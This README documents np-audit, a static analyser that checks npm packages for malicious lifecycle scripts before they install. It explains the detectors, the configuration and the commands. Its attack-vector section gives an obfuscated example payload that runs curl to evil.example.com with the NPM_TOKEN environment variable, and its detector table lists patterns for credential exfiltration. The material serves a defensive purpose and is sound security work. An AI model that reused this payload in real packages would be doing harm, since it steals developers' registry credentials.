![np-audit](docs/title-image.png)

[![npm version](https://img.shields.io/npm/v/np-audit.svg)](https://www.npmjs.com/package/np-audit)
[![npm downloads](https://img.shields.io/npm/dm/np-audit.svg)](https://www.npmjs.com/package/np-audit)
[![npm package size](https://img.shields.io/npm/unpacked-size/np-audit)](https://www.npmjs.com/package/np-audit)
[![GitHub license](https://img.shields.io/github/license/KoblerS/np-audit.svg)](https://github.com/KoblerS/np-audit/blob/main/LICENSE)
[![CI](https://github.com/KoblerS/np-audit/actions/workflows/ci.yml/badge.svg)](https://github.com/KoblerS/np-audit/actions/workflows/ci.yml)
[![codecov](https://codecov.io/gh/KoblerS/np-audit/branch/main/graph/badge.svg)](https://codecov.io/gh/KoblerS/np-audit)

# np-audit — npm package auditor

Static security analysis for npm packages — detects obfuscated lifecycle scripts, known vulnerabilities, and malicious patterns **before** they run. Drop-in replacement for `npm install` and `npm ci`.

**Zero dependencies.** Pure Node.js built-ins only.

```bash
npx np-audit scan express
```

```bash
npm install -g np-audit
npa scan                     # scan all deps
npa install                  # audit then install
alias npm='npa'              # use as drop-in replacement
```

---

## Marshallers

Detection is split into modular marshallers — each one detects a single attack signal:

| Marshaller | What it detects | Score |
| ---------- | --------------- | ----- |
| `eval/dynamic-exec` | `eval()`, `new Function()`, indirect eval, `vm.*`, `setTimeout` with string | 8 |
| `obfuscator.io` | `_0x` variable naming patterns (obfuscator.io output) | 9–80 |
| `high-entropy-string` | Long strings or concatenation chains with high Shannon entropy | 6 |
| `hex-escape-density` | Dense `\xNN` and `\uXXXX` escape sequences | 5–50 |
| `fromCharCode` | `String.fromCharCode` with many args, large decimal char-code arrays | 7 |
| `encoded-decode` | Base64/hex decode (`atob`, `Buffer.from`) optionally combined with `eval` | 3–8 |
| `child-process` | `require('child_process')`, `exec`, `spawn`, `fork`, worker_threads | 5 |
| `hex-array` | Large numbers of `0x` hex literal values | 7–60 |
| `process-env` | `process.env` access (credential exfiltration signal) | 3 |
| `network-call` | `require('https')`, `fetch()`, `dns`, `net`, `tls` | 4 |
| `filesystem-manipulation` | `fs.writeFile`, `chmod`, `symlink` (backdoor persistence) | 3–4 |
| `known-vulnerability` | Known CVEs via Snyk API or OSV.dev | 4–6 (WARN), 80 (malicious) |

Scores scale with severity — higher counts of obfuscation indicators produce higher scores. The final verdict is based on the highest individual score across all marshallers.

See [CONTRIBUTING.md](CONTRIBUTING.md) for how to write custom marshallers.

---

## Vulnerability Scanning (CVE)

Every scanned package is checked against known vulnerability databases alongside the code analysis.

**Default: OSV.dev (no setup required)**

Works out of the box — queries the free [OSV.dev](https://osv.dev/) API for known vulnerabilities and malicious package advisories.

**Optional: Snyk API (richer data)**

```bash
# Environment variable
export SNYK_API_TOKEN=your-token-here

# Or via Snyk CLI
snyk auth
```

Token resolution order: `SNYK_API_TOKEN` → `SNYK_TOKEN` → `~/.config/configstore/snyk.json`

| Severity | Score | Verdict |
| -------- | ----- | ------- |
| Malicious package | 80 | DANGER |
| 10+ vulnerabilities | 6 | WARN |
| 5–9 vulnerabilities | 5 | WARN |
| 1–4 vulnerabilities | 4 | WARN |

Non-malicious CVEs produce warnings but never block installation. Only confirmed malicious packages trigger DANGER.

---

## Usage

### Commands

| Command                        | Alias       | Description                        |
| ------------------------------ | ----------- | ---------------------------------- |
| `npa install [package]`        | `npa i`     | Audit then run `npm install`       |
| `npa ci`                       | —           | Audit then run `npm ci`            |
| `npa scan [package]`           | `npa s`     | Scan only, no install              |
| `npa config get`               | `npa c get` | Show current configuration         |
| `npa config set <key> <value>` | `npa c set` | Update a config value              |
| `npa alias --install`          | —           | Install shell alias                |
| `npa alias --uninstall`        | —           | Remove shell alias                 |

Any unrecognized command is forwarded to npm (e.g. `npa run test`, `npa publish`).

### Flags

| Flag        | Alias | Works with              | Description                                      |
| ----------- | ----- | ----------------------- | ------------------------------------------------ |
| `--review`  | `-r`  | `install`, `ci`         | Interactive mode — choose which scripts to allow |
| `--json`    | —     | `install`, `ci`, `scan` | Machine-readable JSON output                     |
| `--no-dev`  | —     | `install`, `ci`, `scan` | Skip devDependencies                             |
| `--verbose` | —     | all                     | Show fetch progress and extra detail             |
| `--version` | `-v`  | —                       | Print version and exit                           |
| `--help`    | `-h`  | —                       | Print help and exit                              |

### Interactive `--review` mode

```bash
npa install --review
```

```
  npa --review mode
  Use ↑/↓ to navigate, SPACE to toggle, ENTER to confirm, q to quit

  Found 3 package(s) with install scripts:

     [✓ allow] esbuild@0.24.2       postinstall: post-install.js     OK
   ▶ [✗ deny ] evil-sdk@1.0.0       postinstall: install.js          DANGER (score: 9)
     [✓ allow] @scope/pkg@2.1.0     postinstall: install.js          WARN (score: 5)

  2 allowed  1 denied
```

---

## Configuration

Config is stored in `~/.npmauditor.json` (global) and can be overridden per project with `.npmauditor.json`.

```bash
npa config get                              # Show current config
npa config set blockScore 6                 # Block at score 6+
npa config set skipPackages '["esbuild"]'   # Trust specific packages
npa config set skipScopes '["@types"]'      # Trust entire scopes
```

### All config keys

| Key               | Default                      | Description                             |
| ----------------- | ---------------------------- | --------------------------------------- |
| `blockScore`      | `7`                          | Score threshold for DANGER (exit 1)     |
| `warnScore`       | `4`                          | Score threshold for WARN (exit 0)       |
| `registry`        | `https://registry.npmjs.org` | npm registry URL                        |
| `timeout`         | `30000`                      | HTTP request timeout (ms)               |
| `parallelFetches` | `5`                          | Concurrent downloads                    |
| `skipScopes`      | `[]`                         | `@scope` prefixes to skip               |
| `skipPackages`    | `[]`                         | Package names to skip                   |
| `silent`          | `false`                      | Suppress output when no issues found    |
| `scanSelf`        | `true`                       | Scan own project lifecycle scripts      |
| `maxTarballSize`  | `50MB`                       | Max unpacked tarball size (bomb protection) |
| `checkVulnerabilities` | `true`                  | Check packages against CVE databases    |
| `deepResolve`     | `false`                      | Resolve full transitive dependency tree |

---

## Shell Alias

Use npa as a transparent npm replacement:

```bash
npa alias --install     # adds: alias npm='npa'
source ~/.zshrc         # reload shell
```

Now `npm install`, `npm ci` scan automatically. All other npm commands (`npm run`, `npm test`, `npm publish`) pass through unchanged.

```bash
npa alias --uninstall   # remove the alias
```

---

## How It Works

1. **Parse** `package-lock.json` (v1/v2/v3) or resolve from `package.json`
2. **Fetch** tarballs from registry (or read from `node_modules`)
3. **Parse** lifecycle commands — splits `&&`/`||`/`;`/`|`, handles `node -e`, `sh -c`, shell scripts
4. **Walk** the `require()`/`import` graph from each entry (cycle detection, 50 file / 5 MB cap)
5. **Analyze** with all marshallers — static code checks + CVE database queries
6. **Score** and classify: DANGER / WARN / OK
7. **Report** or proceed with install

---

## The Attack Vector

Supply chain attacks abuse npm lifecycle scripts. When you run `npm install`, any `preinstall`/`install`/`postinstall` script runs automatically. Attackers hide payloads behind obfuscation:

```js
var _0x3f2a = ['\x72\x65\x71\x75\x69\x72\x65', '\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'];
eval(String.fromCharCode(114,101,113,117,105,114,101)+'(\'child_process\').exec(\'curl http://evil.example.com/\'+process.env.NPM_TOKEN)');
```

Real-world incidents:

- **[event-stream (2018)](https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident)** — Bitcoin wallet credential theft
- **[ua-parser-js (2021)](https://github.com/advisories/GHSA-pjwm-rvh2-c87w)** — crypto miner + info-stealer
- **[node-ipc (2022)](https://snyk.io/blog/peacenotwar-malicious-npm-node-ipc-package-vulnerability/)** — geo-targeted wiper malware
- **[colors / faker (2022)](https://snyk.io/blog/open-source-npm-packages-colors-faker/)** — maintainer sabotage
- **[SAP CAP / cds-dbs (2025)](https://community.sap.com/t5/technology-blog-posts-by-sap/cap-developers-call-to-action-to-mitigate-and-apply-solution-provided-in/ba-p/14387683)** — compromised package targeting enterprise developers

`npa` **never executes** scripts. It downloads and statically analyzes them.

---

## Exit Codes

| Code | Meaning                             |
| ---- | ----------------------------------- |
| `0`  | All clean or only warnings          |
| `1`  | One or more packages blocked        |

---

## License

MIT
